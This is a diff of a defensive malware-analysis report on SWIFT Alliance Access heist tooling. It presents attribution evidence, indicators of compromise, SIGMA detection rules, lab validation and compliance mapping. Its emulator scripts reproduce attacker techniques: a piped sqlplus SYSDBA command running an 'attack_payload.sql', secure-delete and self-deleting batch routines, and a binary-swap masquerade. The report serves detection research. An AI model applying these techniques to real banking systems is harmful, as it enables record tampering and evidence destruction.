 ### 4.3 Identical String Constants Across All Three Binaries
 
@@ -698,10 +697,10 @@ This is not "same algorithm at the pseudocode level" — it is the same implemen
 |---|---|---|---|
 | `gpca.dat` | `.data:0x40F05C` | `.data:0x403010` area | `0x5048` |
 | `recas.dat` | `.data:0x40F050` | present | `0x503C` |
-| `Allians` | `.data:0x40F0D4` | — | `0x50C0` |
-| `Administrator` | `.data:0x40F0C4` | — | `0x50B0` |
-| `.\" " _DO_NOT_USE_MM_` | `.data:0x40F12C` | — | `0x50C8` |
-| `evtsys.exe` | `.data:0x40FAB4` | own name | — |
+| `Allians` | `.data:0x40F0D4` | : | `0x50C0` |
+| `Administrator` | `.data:0x40F0C4` | : | `0x50B0` |
+| `.\" " _DO_NOT_USE_MM_` | `.data:0x40F12C` | : | `0x50C8` |
+| `evtsys.exe` | `.data:0x40FAB4` | own name | : |
 
 ### 4.4 Same Compiler Toolchain
 
@@ -709,7 +708,7 @@ All three binaries show: a Visual Studio 6.0 rich header; `MSVCP60.dll` dependen
 
 ### 4.5 Adjacent Compile Timestamps
 
-Already covered in Section 2.3 — all three within a 46-hour window, evtdiag compiled less than 18 hours before the scheduled kill switch.
+Already covered in Section 2.3 : all three within a 46-hour window, evtdiag compiled less than 18 hours before the scheduled kill switch.
 
 ### 4.6 Same Filename Masquerade Pattern
 
@@ -725,17 +724,17 @@ This level of naming consistency across all three artifacts points to a single a
 
 Taken together, beyond the six formal attribution lines above, the technical detail supports a specific operational picture, worth stating plainly and cautiously as inference rather than fact:
 
-**The compile timestamps** tell a story numbers alone don't capture. `evtsys.exe` compiled February 4 at 13:45 UTC; `nroff_b.exe` followed February 5 at 08:55; `evtdiag.exe` — the main binary — was compiled last, on February 5 at 11:46, less than 18 hours before the kill switch was designed to fire. The developer was still compiling the main binary the day before the operation ended. This does not read as a team that prepared months in advance and tested carefully — it suggests a rushed final build, possibly incorporating last-minute changes based on reconnaissance of the victim environment. The kill switch date is hardcoded as literal bytes in the binary (year `0x7E0`, month `0x02`, day `0x06`). Someone sat down and typed that date. They knew exactly how long the operation needed to run.
+**The compile timestamps** tell a story numbers alone don't capture. `evtsys.exe` compiled February 4 at 13:45 UTC; `nroff_b.exe` followed February 5 at 08:55; `evtdiag.exe` : the main binary : was compiled last, on February 5 at 11:46, less than 18 hours before the kill switch was designed to fire. The developer was still compiling the main binary the day before the operation ended. This does not read as a team that prepared months in advance and tested carefully : it suggests a rushed final build, possibly incorporating last-minute changes based on reconnaissance of the victim environment. The kill switch date is hardcoded as literal bytes in the binary (year `0x7E0`, month `0x02`, day `0x06`). Someone sat down and typed that date. They knew exactly how long the operation needed to run.
 
-**The "Allians" misspelling** is small but telling. The legitimate SWIFT software directory is "Alliance." The attacker consistently used "Allians" — in the path template, the directory name, the config file location — appearing in at least four distinct string constants across the binary, not a one-time typo corrected elsewhere. Either the attacker copied the misspelling from an internal reconnaissance note that itself contained the error, or they observed the actual directory on the victim system and it had already been created with that spelling before the malware was written — meaning the directory was pre-staged by someone with physical or remote access to the server before the binaries were compiled.
+**The "Allians" misspelling** is small but telling. The legitimate SWIFT software directory is "Alliance." The attacker consistently used "Allians" : in the path template, the directory name, the config file location : appearing in at least four distinct string constants across the binary, not a one-time typo corrected elsewhere. Either the attacker copied the misspelling from an internal reconnaissance note that itself contained the error, or they observed the actual directory on the victim system and it had already been created with that spelling before the malware was written : meaning the directory was pre-staged by someone with physical or remote access to the server before the binaries were compiled.
 
-**The operator CLI is the most psychologically revealing artifact.** Twelve commands. Pause, resume, on, off, queue for the printer. Install and uninstall for the liboradb patch — both directions. A manual C2 beacon trigger. A file-staging command and a separate swap command. This is not a fire-and-forget tool. Someone planned to be present during the operation, issuing commands, monitoring the printer, controlling the patch state. The bidirectionality of the patch — the ability to uninstall as cleanly as install — suggests an operator who expected to need to leave the system in a clean state on demand, not only at the kill switch. They thought about getting caught mid-operation and planned an exit.
+**The operator CLI is the most psychologically revealing artifact.** Twelve commands. Pause, resume, on, off, queue for the printer. Install and uninstall for the liboradb patch : both directions. A manual C2 beacon trigger. A file-staging command and a separate swap command. This is not a fire-and-forget tool. Someone planned to be present during the operation, issuing commands, monitoring the printer, controlling the patch state. The bidirectionality of the patch : the ability to uninstall as cleanly as install : suggests an operator who expected to need to leave the system in a clean state on demand, not only at the kill switch. They thought about getting caught mid-operation and planned an exit.
 
-**The filter list is perhaps the most operationally significant detail.** The 112 SWIFT transaction reference numbers in `gpca.dat` are not generic patterns — they are the specific identifiers of the fraudulent transfers the attackers were about to send. You cannot have those references before the transfers exist. This means `gpca.dat` was prepared after the fraudulent SWIFT messages were composed and their references were known, but before they were sent. The malware and the fraud were coordinated at a level of precision that required advance knowledge of the exact transaction identifiers — knowledge that only someone with access to the SWIFT terminal could have, or someone who received those identifiers from an insider who did.
+**The filter list is perhaps the most operationally significant detail.** The 112 SWIFT transaction reference numbers in `gpca.dat` are not generic patterns : they are the specific identifiers of the fraudulent transfers the attackers were about to send. You cannot have those references before the transfers exist. This means `gpca.dat` was prepared after the fraudulent SWIFT messages were composed and their references were known, but before they were sent. The malware and the fraud were coordinated at a level of precision that required advance knowledge of the exact transaction identifiers : knowledge that only someone with access to the SWIFT terminal could have, or someone who received those identifiers from an insider who did.
 
-**Read together:** a developer working under time pressure in the final hours before an operation, working from a shared codebase, building a tool that assumed an operator would be present and interactive during execution, using transaction references that required insider knowledge to obtain. The technical artifacts are consistent with a small, disciplined team — one person writing the code, at least one other with access to the victim's SWIFT terminal. This is inference from the evidence above, presented as such, not as an independently proven fact.
+**Read together:** a developer working under time pressure in the final hours before an operation, working from a shared codebase, building a tool that assumed an operator would be present and interactive during execution, using transaction references that required insider knowledge to obtain. The technical artifacts are consistent with a small, disciplined team : one person writing the code, at least one other with access to the victim's SWIFT terminal. This is inference from the evidence above, presented as such, not as an independently proven fact.
 
-> [PHOTO: A simple visual — the six attribution lines as icons/checkmarks converging on a single "same author/team" conclusion box. Good LinkedIn-carousel material.]
+> [PHOTO: A simple visual : the six attribution lines as icons/checkmarks converging on a single "same author/team" conclusion box. Good LinkedIn-carousel material.]
 
 ---
 
@@ -743,7 +742,7 @@ Taken together, beyond the six formal attribution lines above, the technical det
 
 All IOCs below are grounded in disassembly evidence documented in Section 3. Priority ratings reflect detectability, uniqueness (low false-positive risk), and persistence (how long the indicator survives on a clean system).
 
-### 5.1 CRITICAL — High fidelity, almost no false positives
+### 5.1 CRITICAL : High fidelity, almost no false positives
 
 > Any single CRITICAL indicator, if found on a system running SWIFT Alliance Access, warrants immediate incident response.
 
@@ -753,14 +752,14 @@ All IOCs below are grounded in disassembly evidence documented in Section 3. Pri
 | File `nroff.exe.bak` in any Alliance directory | File artifact | `FUN_00409920` | Created when malware backs up legitimate nroff.exe |
 | File `rnoff.exe` in any Alliance directory | File artifact | `.data:0x40FCAC` | The malicious replacement for nroff.exe |
 | File `%TEMP%\evchk.bat` | File artifact | `FUN_00401230` | Dropped by evtsys during self-deletion, name built byte-by-byte |
-| `196.202.103.174` in any connection/DNS query | Network/IP | `DAT_00419394` | Hardcoded C2 (dead as of publication — behavioral value only) |
+| `196.202.103.174` in any connection/DNS query | Network/IP | `DAT_00419394` | Hardcoded C2 (dead as of publication : behavioral value only) |
 | `GET /al?---O` / `---C` / `---N` in HTTP traffic | Network/HTTP | `.data:0x40FA90-0x40FAA0` | C2 heartbeat markers, very specific URI pattern |
 | `_DO_NOT_USE_MM_` inside any `.prt`/`.fal` file | File content | `.data:0x40F12C` | nroff-comment sentinel, not present in legitimate nroff output |
 | RC4 key `4E381FA77F08CCAA0D56EDEFF9ED08EF` on disk | File content | `.data:0x40F020` | Hardcoded in both binaries; finding it in a memory dump is definitive |
 | `evtdiag.exe -i / -u / -svc / -t` in process command line | Process | `FUN_00409db0` | No legitimate binary uses these flags with this name |
 | `OpenProcess(0x1F0FFF)` targeting a process holding liboradb.dll | Process/Sysmon | `FUN_004023b0` | PROCESS_ALL_ACCESS on a SWIFT process; Sysmon Event 10, GrantedAccess=0x1F0FFF |
 
-### 5.2 HIGH — Strong indicators, very low false-positive rate in Alliance Access environments
+### 5.2 HIGH : Strong indicators, very low false-positive rate in Alliance Access environments
 
 | IOC | Type | Notes |
 |---|---|---|
@@ -773,14 +772,14 @@ All IOCs below are grounded in disassembly evidence documented in Section 3. Pri
 | Temp SQL file with prefix `SQL`/`TMP` containing `SET FEEDBACK OFF` / `set linesize 32567` | File content | Preamble strings before DELETE/UPDATE |
 | `DeleteService` call against `diagsysevt` | API/Registry | Part of the cleanup chain |
 
-### 5.3 MEDIUM — Useful in combination, higher false-positive rate alone
+### 5.3 MEDIUM : Useful in combination, higher false-positive rate alone
 
 | IOC | Type | Notes |
 |---|---|---|
 | `gpca.dat` in any non-standard directory | File | Generic filename, specific to this toolkit in context |
 | `recas.dat` alongside `gpca.dat` in an `Allians\` directory | File | Presence together more significant than either alone |
-| Directory named `Allians` under `AppData\Local\Administrator` | File/Directory | Misspelled — legitimate SWIFT uses "Alliance" |
-| `mcf\` subdirectory being written alongside `mcm\`, `mcp\`, `mcs\` | File | Novel finding — the fourth monitored directory |
+| Directory named `Allians` under `AppData\Local\Administrator` | File/Directory | Misspelled : legitimate SWIFT uses "Alliance" |
+| `mcf\` subdirectory being written alongside `mcm\`, `mcp\`, `mcs\` | File | Novel finding : the fourth monitored directory |
 | SWIFT MT tags `36B:`, `61:`, `64:`, `65:` parsed by a non-SWIFT process | Behavioral | Extended tag set beyond BAE's original documentation |
 | HTTP `GET /al?` to port 80 (any host) | Network | Generic beacon URI pattern, significant only combined with others |
 | Rapid zero-byte writes to 4-character-filename files in SWIFT spool directories | File/Behavioral | The PRT cleanup loop running every second |
@@ -794,13 +793,13 @@ All IOCs below are grounded in disassembly evidence documented in Section 3. Pri
 2. **SIEM/EDR rules (live detection):** correlate Sysmon Event 1 (ProcessCreate, `evtdiag.exe -i/-u/-svc/-t`), Event 10 (ProcessAccess, `GrantedAccess=0x1F0FFF`), Event 11 (FileCreate, `evchk.bat` in `%TEMP%`), Event 7 (ImageLoad, `liboradb.dll` by an unexpected process), Event 13 (Registry CreateKey under `Services\diagsysevt`).
 3. **Network monitoring:** any HTTP GET to `196.202.103.174` on port 80 with URI starting `/al?` is a definitive C2 beacon; the pattern class (`/al?---O` / `---C` / `---N`) is unique to this family even once the specific IP is dead.
 
-> Priority ordering for a triage analyst: start with CRITICAL indicators (any one is dispositive), escalate immediately. HIGH indicators warrant collection and containment. MEDIUM indicators warrant investigation but should be considered in clusters — two or more MEDIUM indicators together are as significant as a single HIGH indicator.
+> Priority ordering for a triage analyst: start with CRITICAL indicators (any one is dispositive), escalate immediately. HIGH indicators warrant collection and containment. MEDIUM indicators warrant investigation but should be considered in clusters : two or more MEDIUM indicators together are as significant as a single HIGH indicator.
 
 ---
 
 ## 6. Novel Findings
 
-The following table tracks every significant finding from this analysis against what prior public sources (BAE Systems 2016a/2016b, DOJ 2018, Oosthoek & Doerr 2021) actually document — not what is assumed to be documented. This discipline matters: it is easy to claim novelty; it is harder to check it line by line against the actual prior record, which is what this table does.
+The following table tracks every significant finding from this analysis against what prior public sources (BAE Systems 2016a/2016b, DOJ 2018, Oosthoek & Doerr 2021) actually document : not what is assumed to be documented. This discipline matters: it is easy to claim novelty; it is harder to check it line by line against the actual prior record, which is what this table does.
 
 | # | Finding | Prior coverage | Status |
 |---|---|---|---|
@@ -821,7 +820,7 @@ The following table tracks every significant finding from this analysis against 
 | 15 | RC4 key vestigial-but-present in evtsys (0 XREFs) | Not documented | **Novel** |
 | 16 | `recas.dat` is plaintext, NOT XOR-encoded | **Corrects Oosthoek & Doerr (2021), Table III, capability 11** | **Correction to peer-reviewed literature** |
 | 17 | liboradb.dll patch is a targeted memory write, not a "buffer overflow / NOP sled" | **Corrects Oosthoek & Doerr (2021), Section VI-A** | **Correction to peer-reviewed literature** |
-| 18 | `PROCESS_ALL_ACCESS (0x1F0FFF)` used where minimal rights would suffice — a detection surface | Not flagged as a detection opportunity anywhere | **Novel** |
+| 18 | `PROCESS_ALL_ACCESS (0x1F0FFF)` used where minimal rights would suffice : a detection surface | Not flagged as a detection opportunity anywhere | **Novel** |
 | 19 | The `evchk.bat` filename constructed byte-by-byte at runtime (anti-string-dump obfuscation) | Not documented | **Novel** |
 | 20 | `$UsnJrnl` survives the rename-then-delete technique (forensic limitation of the anti-forensic method) | Not discussed | **Novel** |
 | 21 | 112 filter-list entries are the *actual* fraudulent transaction references, implying insider timing | BAE describes the filter list generically | **Extends prior work** |
@@ -831,11 +830,11 @@ The following table tracks every significant finding from this analysis against 
 | 25 | Compile-timestamp analysis (46-hour window, 18-hour margin to kill switch) | BAE/DOJ give some dates; the tight-window narrative interpretation is original | **Extends prior work** |
 | 26 | nroff_b.exe MT-type classification logic (MT950/MT515/NAK routing) | Not documented anywhere | **Novel** |
 | 27 | Message-block extractor shared between print and message-file subsystems (5 XREFs, 2 callers) | Not documented | **Novel** |
-| 28 | fpat.exe (African Bank) patches on-disk vs. evtdiag's in-memory-only patch — implementation distinction | DOJ documents both incidents; the direct side-by-side implementation comparison is original synthesis | **Extends prior work** |
+| 28 | fpat.exe (African Bank) patches on-disk vs. evtdiag's in-memory-only patch : implementation distinction | DOJ documents both incidents; the direct side-by-side implementation comparison is original synthesis | **Extends prior work** |
 | 29 | Sysmon 15.21 crashes on `name` attribute in `FileDelete` rule elements (tooling finding, not malware finding) | Historically reported for older Sysmon versions/different scenario; this is a distinct/regressed instance | **Novel (tooling, not malware)** |
-| 30 | 8 deployable SIGMA rules derived from this behavioral taxonomy | **No prior detection content of any kind exists for this incident** | **Novel — the core contribution** |
+| 30 | 8 deployable SIGMA rules derived from this behavioral taxonomy | **No prior detection content of any kind exists for this incident** | **Novel : the core contribution** |
 
-> [PHOTO: This table works well as a scrollable LinkedIn carousel — one finding per slide, "Novel" ones highlighted in a different color from "Extends prior work" and the two "Correction" entries.]
+> [PHOTO: This table works well as a scrollable LinkedIn carousel : one finding per slide, "Novel" ones highlighted in a different color from "Extends prior work" and the two "Correction" entries.]
 
 ---
 
@@ -843,7 +842,7 @@ The following table tracks every significant finding from this analysis against 
 
 Eight rules, derived directly from the behavioral taxonomy in Section 3, validated end-to-end against the environment in Section 8. Rules 1 and 6 use SIGMA's native `correlation` construct for multi-event anti-forensic sequences that no single log line can represent.
 
-### Rule 1 — liboradb.dll Memory-Write Access
+### Rule 1 : liboradb.dll Memory-Write Access
 
 ```yaml
 title: Suspicious Memory-Write Access to Process Hosting liboradb.dll
@@ -886,7 +885,7 @@ falsepositives:
 level: high
 ```
 
-### Rule 2 — SQL Client Invoked as SYSDBA via Piped Shell
+### Rule 2 : SQL Client Invoked as SYSDBA via Piped Shell
 
 ```yaml
 title: SWIFT Database Client Invoked as SYSDBA via Piped Shell Command
@@ -922,7 +921,7 @@ falsepositives:
 level: high
 ```
 
-### Rule 3 — Unauthorized DELETE on SAAOWNER Schema
+### Rule 3 : Unauthorized DELETE on SAAOWNER Schema
 
 ```yaml
 title: Unauthorized DELETE on SWIFT Alliance Access SAAOWNER Schema
@@ -957,7 +956,7 @@ falsepositives:
 level: critical
 ```
 
-### Rule 4 — Unauthorized UPDATE of Financial Amount Field
+### Rule 4 : Unauthorized UPDATE of Financial Amount Field
 
 ```yaml
 title: Unauthorized UPDATE of Financial Amount Field on SWIFT SAAOWNER Schema
@@ -991,7 +990,7 @@ falsepositives:
 level: critical
 ```
 
-### Rule 5 — SWIFT Confirmation Content in Message Files
+### Rule 5 : SWIFT Confirmation Content in Message Files
 
 ```yaml
 title: SWIFT Confirmation Message Content in Alliance Access Message Files
@@ -1027,7 +1026,7 @@ falsepositives:
 level: low
 ```
 
-### Rule 6 — Secure-Delete Correlation (Multi-Event)
+### Rule 6 : Secure-Delete Correlation (Multi-Event)
 
 ```yaml
 title: Secure-Delete Pattern - File Rename to Random String Followed by Deletion
@@ -1086,7 +1085,7 @@ detection:
 level: informational
 ```
 
-### Rule 7 — Self-Deletion via Batch File with Ping-Delay Loop
+### Rule 7 : Self-Deletion via Batch File with Ping-Delay Loop
 
 ```yaml
 title: Process Self-Deletion via Dropped Batch File with Ping-Delay Loop
@@ -1122,7 +1121,7 @@ falsepositives:
 level: medium
 ```
 
-### Rule 8 — Legitimate Binary Masquerade Swap
+### Rule 8 : Legitimate Binary Masquerade Swap
 
 ```yaml
 title: Legitimate Binary Backed Up and Replaced Under Original Filename
@@ -1161,9 +1160,9 @@ level: medium
 
 ## 8. Environment Building
 
-SWIFT Alliance Access is proprietary, licensed exclusively to SWIFT member institutions through a paid commercial process — a 2011 datasheet lists a one-time fee of **€43,600** plus **€14,000/year** maintenance. No free, trial, or academic-access path exists, and the associated Developer Kit has been in maintenance mode with no new licenses issued since late 2023. This is a hard ceiling, not a research gap: every primary forensic source cited in this report analyzed this malware from the outside, without real Alliance Access, for exactly the same reason.
+SWIFT Alliance Access is proprietary, licensed exclusively to SWIFT member institutions through a paid commercial process : a 2011 datasheet lists a one-time fee of **€43,600** plus **€14,000/year** maintenance. No free, trial, or academic-access path exists, and the associated Developer Kit has been in maintenance mode with no new licenses issued since late 2023. This is a hard ceiling, not a research gap: every primary forensic source cited in this report analyzed this malware from the outside, without real Alliance Access, for exactly the same reason.
 
-**The environment built here is therefore an honest simulation of the environment class Alliance Access runs in** — Windows Server, Oracle Database, the documented file/folder structure — not a reproduction of the proprietary application itself.
+**The environment built here is therefore an honest simulation of the environment class Alliance Access runs in** : Windows Server, Oracle Database, the documented file/folder structure : not a reproduction of the proprietary application itself.
 
 ### 8.1 Stack
 
@@ -1208,13 +1207,13 @@ CREATE AUDIT POLICY sentry_saaowner_dml
 AUDIT POLICY sentry_saaowner_dml;
 ```
 
-> Note: `_TEST`/`_01` suffixes are lab placeholders — BAE's actual SQL uses an undocumented wildcard (`MESG_%s`), and the real suffix is unknown. `MESG_CREATE_DATE` is a synthetic lab-convenience column, not a documented field.
+> Note: `_TEST`/`_01` suffixes are lab placeholders : BAE's actual SQL uses an undocumented wildcard (`MESG_%s`), and the real suffix is unknown. `MESG_CREATE_DATE` is a synthetic lab-convenience column, not a documented field.
 
 ### 8.3 The Sysmon Debugging Story (Full, Unfiltered)
 
-This is worth documenting in full because both bugs were real, non-obvious, and each ate significant time — exactly the kind of thing a "how it actually went" writeup should include rather than smooth over.
+This is worth documenting in full because both bugs were real, non-obvious, and each ate significant time : exactly the kind of thing a "how it actually went" writeup should include rather than smooth over.
 
-**Bug 1 — ImageLoad (Event ID 7) silently disabled.**
+**Bug 1 : ImageLoad (Event ID 7) silently disabled.**
 `sysmon64.exe -c` showed `Image loading: disabled` globally, and the config comment literally said: *"Using 'include' with no rules means nothing in this section will be logged."* Fixed by scoping a real rule:
 
 ```xml
@@ -1223,8 +1222,8 @@ This is worth documenting in full because both bugs were real, non-obvious, and 
 </ImageLoad>
 ```
 
-**Bug 2 — ProcessAccess (Event ID 10), same trap, worse mistake on my part.**
-Same empty-include problem. First fix attempt was **wrong**: filtering `GrantedAccess condition="contains any" value="0x0020;0x0008;..."`, assuming individual permission flags would appear as substrings in the logged value. **This is mathematically incorrect** — Sysmon logs the bitwise-OR'd combined result (e.g., `0x1028`), which does not textually contain `0x0020` or `0x0008`. Confirmed via testing: zero events logged despite the underlying `OpenProcess()` calls succeeding at the OS level. Fixed with exact-match hex values once the real combined value was observed from a working test:
+**Bug 2 : ProcessAccess (Event ID 10), same trap, worse mistake on my part.**
+Same empty-include problem. First fix attempt was **wrong**: filtering `GrantedAccess condition="contains any" value="0x0020;0x0008;..."`, assuming individual permission flags would appear as substrings in the logged value. **This is mathematically incorrect** : Sysmon logs the bitwise-OR'd combined result (e.g., `0x1028`), which does not textually contain `0x0020` or `0x0008`. Confirmed via testing: zero events logged despite the underlying `OpenProcess()` calls succeeding at the OS level. Fixed with exact-match hex values once the real combined value was observed from a working test:
 
 ```xml
 <ProcessAccess onmatch="include">
@@ -1236,7 +1235,7 @@ Same empty-include problem. First fix attempt was **wrong**: filtering `GrantedA
 </ProcessAccess>
 ```
 
-**Bug 3 — Sysmon 15.21 crashes on a `name` attribute inside a `FileDelete` rule.**
+**Bug 3 : Sysmon 15.21 crashes on a `name` attribute inside a `FileDelete` rule.**
 When the Rule 6 secure-delete detection needed a `FileDelete` rule, adding it caused Sysmon to crash on every config reload with `STATUS_STACK_BUFFER_OVERRUN` (exit code `-1073740791`). Isolated via a clean rebuild from an unmodified SwiftOnSecurity baseline, then reapplying each fix one at a time and testing after each:
 
 - ImageLoad fix → survived
@@ -1245,9 +1244,9 @@ When the Rule 6 secure-delete detection needed a `FileDelete` rule, adding it ca
 - FileDelete rule *with* `name="SENTRY"` attribute → **crashed, every time, confirmed via Windows Error Reporting crash logs**
 - FileDelete rule *without* the `name` attribute → worked cleanly
 
-Research confirmed this is not novel — Microsoft Q&A threads document the same crash pattern with FileDelete rules going back to Sysmon v12.03 on Windows 2008 R2, reportedly fixed in v13.02. Its reappearance in v15.21 suggests either a regression or a related, distinct edge case. Reported as a stability finding — see Section 12.
+Research confirmed this is not novel : Microsoft Q&A threads document the same crash pattern with FileDelete rules going back to Sysmon v12.03 on Windows 2008 R2, reportedly fixed in v13.02. Its reappearance in v15.21 suggests either a regression or a related, distinct edge case. Reported as a stability finding : see Section 12.
 
-> Important correction made along the way, worth stating explicitly: `STATUS_STACK_BUFFER_OVERRUN` (0xC0000409) is a legacy-named status code that Microsoft's own engineers have publicly clarified no longer specifically means an exploitable stack overflow — it was broadened years ago to mean "program self-triggered abnormal termination" generally (a `/GS` fast-fail). Reporting this as "found a buffer overflow bug" would be an overclaim. It is correctly reported here as a fast-fail crash, not a confirmed memory-corruption vulnerability.
+> Important correction made along the way, worth stating explicitly: `STATUS_STACK_BUFFER_OVERRUN` (0xC0000409) is a legacy-named status code that Microsoft's own engineers have publicly clarified no longer specifically means an exploitable stack overflow : it was broadened years ago to mean "program self-triggered abnormal termination" generally (a `/GS` fast-fail). Reporting this as "found a buffer overflow bug" would be an overclaim. It is correctly reported here as a fast-fail crash, not a confirmed memory-corruption vulnerability.
 
 **Working, final FileCreate/FileDelete configuration:**
 
@@ -1266,14 +1265,14 @@ Research confirmed this is not novel — Microsoft Q&A threads document the same
 </FileDelete>
 ```
 
-### 8.4 Emulator Scripts (Not the Real Malware — Never Obtained or Used)
+### 8.4 Emulator Scripts (Not the Real Malware : Never Obtained or Used)
 
 Every emulator below was authored from scratch, based purely on the documented behavior in Sections 2-3. At no point was the actual malware sample sourced, downloaded, or executed.
 
-**Rule 1 emulator — liboradb.dll access simulation:**
+**Rule 1 emulator : liboradb.dll access simulation:**
 
 ```csharp
-// dummy_host.cs — loads a stand-in DLL (renamed copy of a harmless system DLL)
+// dummy_host.cs : loads a stand-in DLL (renamed copy of a harmless system DLL)
 using System;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -1293,7 +1292,7 @@ class DummyHost
 ```
 
 ```powershell
-# simulate_patch.ps1 — opens a memory-write-capable handle to the dummy process
+# simulate_patch.ps1 : opens a memory-write-capable handle to the dummy process
 $targetPid = 9992  # match to current dummy_host.exe PID
 
 Add-Type @"
@@ -1315,7 +1314,7 @@ if ($handle -ne [IntPtr]::Zero) {
 }
 ```
 
-**Rule 2/3/4 emulator — sqlplus-piped SYSDBA execution:**
+**Rule 2/3/4 emulator : sqlplus-piped SYSDBA execution:**
 
 ```sql
 -- attack_payload.sql
@@ -1330,15 +1329,15 @@ exit;
 ```
 
 ```powershell
-# simulate_sqlplus_attack.ps1 — reproduces the exact documented command line
+# simulate_sqlplus_attack.ps1 : reproduces the exact documented command line
 $sqlplusPath = "C:\app\...\sqlplus.exe"
 cmd.exe /c "echo exit | `"$sqlplusPath`" -S / as sysdba @C:\Allians\attack_payload.sql > C:\Allians\attack_output.log"
 ```
 
-**Rule 6 emulator — secure-delete sequence:**
+**Rule 6 emulator : secure-delete sequence:**
 
 ```powershell
-# secure_delete_sim.ps1 — reproduces the exact documented algorithm
+# secure_delete_sim.ps1 : reproduces the exact documented algorithm
 $targetPath = "C:\Allians\dummy_target.dat"
 $stream = [System.IO.File]::Open($targetPath, 'Open', 'Write')
 $stream.Seek(0, 'End') | Out-Null
@@ -1363,7 +1362,7 @@ Rename-Item -Path $targetPath -NewName $randomName
 Remove-Item -Path (Join-Path $dir $randomName) -Force
 ```
 
-**Rule 7 emulator — self-delete via batch:**
+**Rule 7 emulator : self-delete via batch:**
 
 ```powershell
 # self_delete_batch_sim.ps1
@@ -1382,7 +1381,7 @@ Set-Content -Path $batPath -Value $batContent -Encoding ASCII
 Start-Process -FilePath $batPath -WindowStyle Hidden
 ```
 
-**Rule 8 emulator — binary-swap masquerade:**
+**Rule 8 emulator : binary-swap masquerade:**
 
 ```powershell
 # binary_swap_sim.ps1
@@ -1392,7 +1391,7 @@ Rename-Item -Path $original -NewName "nroff.exe.bak"
 "malicious replacement placeholder" | Out-File -FilePath $original -Encoding ASCII
 ```
 
-> [PHOTO: A screenshot montage — the VM desktop, the Oracle SQL*Plus session showing a successful connection, and Event Viewer filtered to Sysmon Operational log. Good for showing "this is real, not just theory."]
+> [PHOTO: A screenshot montage : the VM desktop, the Oracle SQL*Plus session showing a successful connection, and Event Viewer filtered to Sysmon Operational log. Good for showing "this is real, not just theory."]
 
 ---
 
@@ -1409,7 +1408,7 @@ Every rule below was validated by (1) running its emulator script, (2) confirmin
 | 3 | Manual DELETE via SAAOWNER session | `unified_audit_trail` entry, `ACTION_NAME: DELETE`, full SQL text captured, correct TEXT-then-MESG order | ✅ Confirmed |
 | 4 | Manual UPDATE via SAAOWNER session | `unified_audit_trail` entry, `ACTION_NAME: UPDATE`, full SQL text with `MESG_FIN_CCY_AMOUNT` captured | ✅ Confirmed |
 | 5 | Dummy SWIFT message generator (mixed content types, running continuously) | Sysmon Event 11, `.prc` files created in `mcm\in\` with real field content | ✅ Confirmed |
-| 6 | `secure_delete_sim.ps1` | Sysmon Event 11 (rename inside `Allians\`) + Event 23 (delete of renamed file) — **required discovering FileDelete was never enabled at all, then the crash bug above** | ✅ Confirmed, after fixing 2 real Sysmon defects |
+| 6 | `secure_delete_sim.ps1` | Sysmon Event 11 (rename inside `Allians\`) + Event 23 (delete of renamed file) : **required discovering FileDelete was never enabled at all, then the crash bug above** | ✅ Confirmed, after fixing 2 real Sysmon defects |
 | 7 | `self_delete_batch_sim.ps1` | Full process tree captured: `powershell.exe` → `cmd.exe /c evchk.bat` → `PING.EXE 0.0.0.0`; Event 11 for `.bat` creation in `%TEMP%` | ✅ Confirmed |
 | 8 | `binary_swap_sim.ps1` | Event 11 for `nroff.exe` creation (both the pre- and post-swap versions) | ✅ Confirmed |
 
@@ -1421,14 +1420,14 @@ All 8 rules were converted via **pySigma / sigconverter.io** (a free, open-sourc
 |---|---|
 | **Splunk (SPL)** | All 8 rules converted successfully, including Rule 6's correlation logic (translated into a `bin`/`stats`/`dc()` windowing idiom) |
 | **Microsoft Sentinel (Kusto/KQL)** | Rules 1-5, 7-8 converted successfully. **Rule 6 failed with an explicit backend error: "Backend does not support correlation rules."** This is a genuine, documented limitation of current SIGMA tooling maturity, not a flaw in the rule's logic. |
-| **SentinelOne EDR** | All 8 rules converted successfully (note: SentinelOne the EDR product is distinct from Microsoft Sentinel the SIEM — a naming collision worth being explicit about, since sigconverter.io lists the EDR target as `sentinel_one`) |
+| **SentinelOne EDR** | All 8 rules converted successfully (note: SentinelOne the EDR product is distinct from Microsoft Sentinel the SIEM : a naming collision worth being explicit about, since sigconverter.io lists the EDR target as `sentinel_one`) |
 
-**Example — Rule 2 converted to Splunk SPL:**
+**Example : Rule 2 converted to Splunk SPL:**
 ```spl
 any where Image:"*\\cmd.exe" and (CommandLine:"*echo exit*" and CommandLine:"*sqlplus*" and CommandLine:"*as sysdba*")
 ```
 
-**Example — Rule 6's correlation logic converted to Splunk SPL:**
+**Example : Rule 6's correlation logic converted to Splunk SPL:**
 ```spl
 | multisearch
 [ search TargetFilename="*\\Allians\\*" | eval event_type="filecreate" ]
@@ -1438,7 +1437,7 @@ any where Image:"*\\cmd.exe" and (CommandLine:"*echo exit*" and CommandLine:"*sq
 | search event_type_count >= 2
 ```
 
-> [PHOTO: Screenshots of the actual sigconverter.io output for at least 2-3 rules — you already have these.]
+> [PHOTO: Screenshots of the actual sigconverter.io output for at least 2-3 rules : you already have these.]
 
 ---
 
@@ -1448,12 +1447,12 @@ The detection content above is mapped against four frameworks relevant to a fina
 
 | Rule | SWIFT CSCF v2024 | Bank Al-Maghrib 3/W/16 | DNSSI 2023 (Morocco) | ISO/IEC 27002 |
 |---|---|---|---|---|
-| 1 | **6.2 Software Integrity** — in-memory integrity checking is listed only as an *Optional Enhancement*, not mandatory. **6.5A Intrusion Detection.** | Testing-methodology alignment (grey-box scope, Art. 10) | EXP-JOURN/SURV-CENTR | A.8.16 |
-| 2 | **6.4 Logging and Monitoring** — explicitly names "command-line history for privileged operating system accounts" as a *minimum required log* | — | EXP-JOURN/SURV-PRIVIL (nominative privileged accounts) | A.8.15 |
-| 3 | **6.3 Database Integrity** — "searches for any unexpectedly deleted records" is also only an *Optional Enhancement* | — | EXP-JOURN/SURV-JOURNAL | A.8.16 |
-| 4 | **2.9 Transaction Business Controls** — explicitly names monitoring "exceptionally high amounts" and sequential-numbering gaps as required measures | — | No direct equivalent — DNSSI is a general baseline, not transaction-specific | A.8.16 |
-| 6 | No explicit filesystem-level anti-forensic control identified in CSCF at all | Aligned with expected pentest scope (Art. 1, 2) | **INCID-GEST-PREUV** — evidence-preservation/chain-of-custody requirement, directly on point | A.5.28 |
